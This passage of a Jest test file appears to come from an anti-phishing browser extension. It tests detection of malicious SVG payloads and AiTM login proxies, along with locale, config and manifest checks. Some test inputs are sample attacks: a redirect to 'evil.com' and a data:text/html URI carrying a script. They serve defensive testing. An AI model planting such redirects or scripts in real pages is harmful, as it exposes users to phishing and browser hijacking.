    const result = simulateSVGScore('', [], 'window.location.href = "https://evil.com"');
    expect(result.detected).toBe(false);
    expect(result.score).toBe(10);
  });

  test('SVG with data:text/html href + event handler', () => {
    const result = simulateSVGScore('', ['data:text/html,<script>evil()</script>'], '', true);
    expect(result.detected).toBe(true);
    expect(result.score).toBe(17); // 12 + 5
  });

  // False positive scenarios
  test('SVG with harmless animation script', () => {
    const result = simulateSVGScore('function animate() { circle.setAttribute("r", "25"); }');
    expect(result.detected).toBe(false);
    expect(result.score).toBe(0);
  });

  test('SVG with d3.js-style code', () => {
    const result = simulateSVGScore('svg.selectAll("circle").data(data).enter().append("circle").attr("cx", d => d.x)');
    expect(result.detected).toBe(false);
    expect(result.score).toBe(0);
  });

  test('SVG with Chart.js event handler (no dangerous patterns)', () => {
    const result = simulateSVGScore('', [], '', false);
    expect(result.detected).toBe(false);
    expect(result.score).toBe(0);
  });

  test('SVG with legitimate foreignObject (no redirect)', () => {
    const result = simulateSVGScore('', [], '<div><p>Hello World</p></div>');
    expect(result.detected).toBe(false);
    expect(result.score).toBe(0);
  });

  test('SVG with safe href links', () => {
    const result = simulateSVGScore('', ['https://example.com', '#section1', 'mailto:test@test.com']);
    expect(result.detected).toBe(false);
    expect(result.score).toBe(0);
  });

  test('Empty SVG (no scripts, no hrefs)', () => {
    const result = simulateSVGScore('', []);
    expect(result.detected).toBe(false);
    expect(result.score).toBe(0);
  });

  test('SVG with comments containing dangerous keywords (should not match)', () => {
    // Script content is checked, and comments are part of textContent
    // But the regex patterns require actual code structure
    const result = simulateSVGScore('// eval is dangerous, never use it\n// window.location should be checked');
    // eval pattern: /\beval\s*\(/i - needs eval( with parenthesis
    // window.location pattern: /window\.location\s*=/i - needs assignment
    expect(result.detected).toBe(false);
    expect(result.score).toBe(0);
  });
});

// ============================================================================
// I18N VERIFICATION
// ============================================================================
describe('i18n Keys Verification', () => {
  const locales = ['ar', 'cs', 'de', 'el', 'en', 'es', 'fr', 'hi', 'hu', 'id', 'it', 'ja', 'ko', 'nl', 'pl', 'pt', 'pt_BR', 'ro', 'ru', 'th', 'tr', 'uk', 'vi', 'zh'];
  const requiredKeys = [
    'aitmProxyTitle', 'aitmProxyMessage', 'aitmProxyTip', 'aitmProxyDetected',
    'svgPayloadTitle', 'svgPayloadMessage', 'svgPayloadTip', 'svgPayloadDetected',
    'tooltipFeature13', 'tooltipFeature14', 'tooltipFooter'
  ];

  for (const locale of locales) {
    test(`${locale} locale should have all 11 new keys`, () => {
      const messagesPath = path.join(__dirname, '..', '..', '_locales', locale, 'messages.json');
      const messages = JSON.parse(fs.readFileSync(messagesPath, 'utf8'));

      for (const key of requiredKeys) {
        expect(messages[key]).toBeDefined();
        expect(messages[key].message).toBeDefined();
        expect(messages[key].message.length).toBeGreaterThan(0);
      }
    });

    test(`${locale} tooltipFooter should contain "14"`, () => {
      const messagesPath = path.join(__dirname, '..', '..', '_locales', locale, 'messages.json');
      const messages = JSON.parse(fs.readFileSync(messagesPath, 'utf8'));
      expect(messages.tooltipFooter.message).toContain('14');
    });

    test(`${locale} aitmProxyMessage should contain {provider} placeholder`, () => {
      const messagesPath = path.join(__dirname, '..', '..', '_locales', locale, 'messages.json');
      const messages = JSON.parse(fs.readFileSync(messagesPath, 'utf8'));
      expect(messages.aitmProxyMessage.message).toContain('{provider}');
    });
  }

  test('no locale should have English text in non-English locales (spot check)', () => {
    const nlMessages = JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', '_locales', 'nl', 'messages.json'), 'utf8'));
    expect(nlMessages.aitmProxyTitle.message).not.toBe('Phishing Proxy Detected!');
    expect(nlMessages.svgPayloadTitle.message).not.toBe('Malicious SVG Detected!');
    expect(nlMessages.tooltipFeature13.message).not.toBe('Login proxy phishing (AiTM)');

    const deMessages = JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', '_locales', 'de', 'messages.json'), 'utf8'));
    expect(deMessages.aitmProxyTitle.message).not.toBe('Phishing Proxy Detected!');
    expect(deMessages.tooltipFooter.message).not.toBe('14 security layers active');

    const jaMessages = JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', '_locales', 'ja', 'messages.json'), 'utf8'));
    expect(jaMessages.aitmProxyTitle.message).not.toBe('Phishing Proxy Detected!');
  });
});

// ============================================================================
// CONFIG INTEGRATION TESTS
// ============================================================================
describe('Config Integration', () => {
  test('ADVANCED_THREAT_DETECTION should contain both new detections', () => {
    expect(CONFIG.ADVANCED_THREAT_DETECTION.aitmDetection).toBeDefined();
    expect(CONFIG.ADVANCED_THREAT_DETECTION.svgPayloadDetection).toBeDefined();
  });

  test('aitmDetection scores should all be positive numbers', () => {
    for (const [key, value] of Object.entries(CONFIG.ADVANCED_THREAT_DETECTION.aitmDetection.scores)) {
      expect(typeof value).toBe('number');
      expect(value).toBeGreaterThan(0);
    }
  });

  test('svgPayloadDetection scores should all be positive numbers', () => {
    for (const [key, value] of Object.entries(CONFIG.ADVANCED_THREAT_DETECTION.svgPayloadDetection.scores)) {
      expect(typeof value).toBe('number');
      expect(value).toBeGreaterThan(0);
    }
  });

  test('svgPayloadDetection patterns should all be RegExp', () => {
    for (const pattern of CONFIG.ADVANCED_THREAT_DETECTION.svgPayloadDetection.dangerousScriptPatterns) {
      // Use constructor.name check to handle cross-realm RegExp (vm context)
      expect(pattern.constructor.name).toBe('RegExp');
      expect(typeof pattern.test).toBe('function');
    }
    for (const pattern of CONFIG.ADVANCED_THREAT_DETECTION.svgPayloadDetection.dangerousURIPatterns) {
      expect(pattern.constructor.name).toBe('RegExp');
      expect(typeof pattern.test).toBe('function');
    }
  });

  test('HIGH_THRESHOLD should be 15 (used by AiTM detection)', () => {
    expect(CONFIG.HIGH_THRESHOLD).toBe(15);
  });

  test('svgPayloadDetection scoreThreshold should be 15', () => {
    expect(CONFIG.ADVANCED_THREAT_DETECTION.svgPayloadDetection.scoreThreshold).toBe(15);
  });

  test('existing ADVANCED_THREAT_DETECTION features should still be present', () => {
    expect(CONFIG.ADVANCED_THREAT_DETECTION.enabled).toBe(true);
    expect(CONFIG.ADVANCED_THREAT_DETECTION.splitQR).toBeDefined();
    expect(CONFIG.ADVANCED_THREAT_DETECTION.oauthProtection).toBeDefined();
    expect(CONFIG.ADVANCED_THREAT_DETECTION.fakeTurnstile).toBeDefined();
  });
});

// ============================================================================
// POPUP/HTML VERIFICATION
// ============================================================================
describe('Popup HTML/JS Verification', () => {
  const popupHtml = fs.readFileSync(path.join(__dirname, '..', '..', 'popup.html'), 'utf8');
  const popupJs = fs.readFileSync(path.join(__dirname, '..', '..', 'popup.js'), 'utf8');

  test('popup.html should have tooltipFeature13 element', () => {
    expect(popupHtml).toContain('id="tooltipFeature13"');
  });

  test('popup.html should have tooltipFeature14 element', () => {
    expect(popupHtml).toContain('id="tooltipFeature14"');
  });

  test('popup.html should have "New" badge on feature 13', () => {
    expect(popupHtml).toMatch(/tooltipFeature13.*new-badge/s);
  });

  test('popup.html should have "New" badge on feature 14', () => {
    expect(popupHtml).toMatch(/tooltipFeature14.*new-badge/s);
  });

  test('popup.html should NOT have "New" badge on feature 11 anymore', () => {
    // Feature 11 line should not contain new-badge
    const feature11Line = popupHtml.split('\n').find(l => l.includes('tooltipFeature11'));
    expect(feature11Line).not.toContain('new-badge');
  });

  test('popup.html should NOT have "New" badge on feature 12 anymore', () => {
    const feature12Line = popupHtml.split('\n').find(l => l.includes('tooltipFeature12'));
    expect(feature12Line).not.toContain('new-badge');
  });

  test('popup.html footer should say "14 security layers active"', () => {
    expect(popupHtml).toContain('14 security layers active');
  });

  test('popup.js should reference tooltipFeature13', () => {
    expect(popupJs).toContain("getElementById('tooltipFeature13')");
  });

  test('popup.js should reference tooltipFeature14', () => {
    expect(popupJs).toContain("getElementById('tooltipFeature14')");
  });

  test('popup.js should translate tooltipFeature13', () => {
    expect(popupJs).toContain("msg('tooltipFeature13')");
  });

  test('popup.js should translate tooltipFeature14', () => {
    expect(popupJs).toContain("msg('tooltipFeature14')");
  });
});

// ============================================================================
// MANIFEST VERIFICATION
// ============================================================================
describe('Manifest Verification', () => {
  const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', 'manifest.json'), 'utf8'));

  test('version should be 8.6.0', () => {
    expect(manifest.version).toBe('8.6.0');
  });

  test('no new permissions should be required', () => {
    // The features don't need any new permissions
    expect(manifest.permissions).not.toContain('webRequest');
    expect(manifest.permissions).not.toContain('activeTab');
    // Should still have existing permissions
    expect(manifest.permissions).toContain('tabs');
    expect(manifest.permissions).toContain('storage');
  });
});

// ============================================================================
// BACKGROUND.JS VERIFICATION
// ============================================================================
describe('Background.js Message Handlers', () => {
  const backgroundJs = fs.readFileSync(path.join(__dirname, '..', '..', 'background.js'), 'utf8');

  test('should have aitmProxyDetected handler', () => {
    expect(backgroundJs).toContain("case 'aitmProxyDetected':");
  });

  test('should have svgPayloadDetected handler', () => {
    expect(backgroundJs).toContain("case 'svgPayloadDetected':");
  });

  test('aitmProxyDetected should set red icon (critical)', () => {
    const handlerSection = backgroundJs.substring(
      backgroundJs.indexOf("case 'aitmProxyDetected':"),
      backgroundJs.indexOf("case 'svgPayloadDetected':")
    );
    expect(handlerSection).toContain('red-circle');
  });

  test('svgPayloadDetected should set red icon (critical)', () => {
    const handlerSection = backgroundJs.substring(
      backgroundJs.indexOf("case 'svgPayloadDetected':"),
      backgroundJs.indexOf("default:", backgroundJs.indexOf("case 'svgPayloadDetected':"))
    );
    expect(handlerSection).toContain('red-circle');
  });

  test('aitmProxyDetected should increment blocked threats count', () => {
    const handlerSection = backgroundJs.substring(
      backgroundJs.indexOf("case 'aitmProxyDetected':"),
      backgroundJs.indexOf("case 'svgPayloadDetected':")
    );
    expect(handlerSection).toContain("incrementBlockedThreatsCount('aitm_proxy')");
  });

  test('svgPayloadDetected should increment blocked threats count', () => {
    const handlerSection = backgroundJs.substring(
      backgroundJs.indexOf("case 'svgPayloadDetected':"),
      backgroundJs.indexOf("default:", backgroundJs.indexOf("case 'svgPayloadDetected':"))
    );
    expect(handlerSection).toContain("incrementBlockedThreatsCount('svg_payload')");
  });
});

// ============================================================================
// CONTENT.JS FUNCTION PRESENCE
// ============================================================================
describe('Content.js Function Presence', () => {
  const contentJs = fs.readFileSync(path.join(__dirname, '..', '..', 'content.js'), 'utf8');

  test('should have detectAiTMProxy function', () => {
    expect(contentJs).toContain('async function detectAiTMProxy()');
  });

  test('should have initAiTMDetection function', () => {
    expect(contentJs).toContain('function initAiTMDetection()');
  });

  test('should have detectSVGPayloads function', () => {
    expect(contentJs).toContain('async function detectSVGPayloads()');
  });

  test('should have initSVGPayloadDetection function', () => {
    expect(contentJs).toContain('function initSVGPayloadDetection()');
  });

  test('detectAiTMProxy should check isProtectionEnabled', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('async function detectAiTMProxy()'),
      contentJs.indexOf('function initAiTMDetection()')
    );
    expect(funcBody).toContain('isProtectionEnabled()');
  });

  test('detectAiTMProxy should check isTrustedDomain', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('async function detectAiTMProxy()'),
      contentJs.indexOf('function initAiTMDetection()')
    );
    expect(funcBody).toContain('isTrustedDomain');
  });

  test('detectSVGPayloads should check isProtectionEnabled', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('async function detectSVGPayloads()'),
      contentJs.indexOf('function initSVGPayloadDetection()')
    );
    expect(funcBody).toContain('isProtectionEnabled()');
  });

  test('detectSVGPayloads should check isTrustedDomain', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('async function detectSVGPayloads()'),
      contentJs.indexOf('function initSVGPayloadDetection()')
    );
    expect(funcBody).toContain('isTrustedDomain');
  });

  test('initAiTMDetection should be called in initialization', () => {
    expect(contentJs).toContain('initAiTMDetection();');
  });

  test('initSVGPayloadDetection should be called in initialization', () => {
    expect(contentJs).toContain('initSVGPayloadDetection();');
  });

  test('AiTM detection should use showSecurityWarning with showTrust:false', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('async function detectAiTMProxy()'),
      contentJs.indexOf('function initAiTMDetection()')
    );
    expect(funcBody).toContain('showTrust: false');
  });

  test('SVG detection should use showSecurityWarning with showTrust:true', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('async function detectSVGPayloads()'),
      contentJs.indexOf('function initSVGPayloadDetection()')
    );
    expect(funcBody).toContain('showTrust: true');
  });

  test('AiTM detection should have 2500ms initial delay', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('function initAiTMDetection()'),
      contentJs.indexOf('function initAiTMDetection()') + 500
    );
    expect(funcBody).toContain('2500');
  });

  test('SVG detection should have 3000ms initial delay', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('function initSVGPayloadDetection()'),
      contentJs.indexOf('function initSVGPayloadDetection()') + 500
    );
    expect(funcBody).toContain('3000');
  });

  test('SVG detection should use WeakSet for deduplication', () => {
    expect(contentJs).toContain('_scannedSVGs');
    expect(contentJs).toContain('new WeakSet()');
  });

  test('AiTM detection should check legitimate providers', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('async function detectAiTMProxy()'),
      contentJs.indexOf('function initAiTMDetection()')
    );
    expect(funcBody).toContain('legitimateProviders');
  });

  test('page risk section should include aitmProxyDetected reason', () => {
    expect(contentJs).toContain("reasonsForPage.add('aitmProxyDetected')");
  });

  test('page risk section should include svgPayloadDetected reason', () => {
    expect(contentJs).toContain("reasonsForPage.add('svgPayloadDetected')");
  });

  test('AiTM MutationObserver should watch for password fields and known IDs', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('function initAiTMDetection()'),
      contentJs.indexOf('async function detectSVGPayloads()')
    );
    expect(funcBody).toContain('input[type="password"]');
    expect(funcBody).toContain('#i0116');
    expect(funcBody).toContain('#identifierId');
  });

  test('SVG MutationObserver should watch for svg, object, and embed elements', () => {
    const funcBody = contentJs.substring(
      contentJs.indexOf('function initSVGPayloadDetection()'),
      contentJs.indexOf('function initSVGPayloadDetection()') + 1000
    );
    expect(funcBody).toContain('svg');
    expect(funcBody).toContain('object[type="image/svg+xml"]');
    expect(funcBody).toContain('embed[type="image/svg+xml"]');
  });
});
